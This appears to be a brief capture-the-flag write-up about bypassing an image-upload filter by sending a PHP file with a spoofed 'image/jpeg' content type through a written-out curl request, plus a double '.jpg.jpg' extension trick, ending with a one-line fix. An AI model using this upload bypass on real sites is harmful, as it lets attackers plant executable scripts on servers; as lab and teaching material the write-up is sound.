In the upload file page, we check to upload some images to test and we realized that the uplaod accept just jpg/jpeg files.

and we create a php file to test and we change his content type to image/jpeg. and send a upload request with curl cmd:

curl -X POST -H 'Content-Type: multipart/form-data' --form 'Upload=Upload' --form 'uploaded=@test.php;type=image/jpeg' http://{IP}/?page=upload

After running this command we got a new flag in the respense.

Also there is another way is to uplaod any file with this extention: .jpg.jpg, and you will got the flag (yes it's the magic)

how to secure:
    - Check the image if a valid image not just the content type or extention.
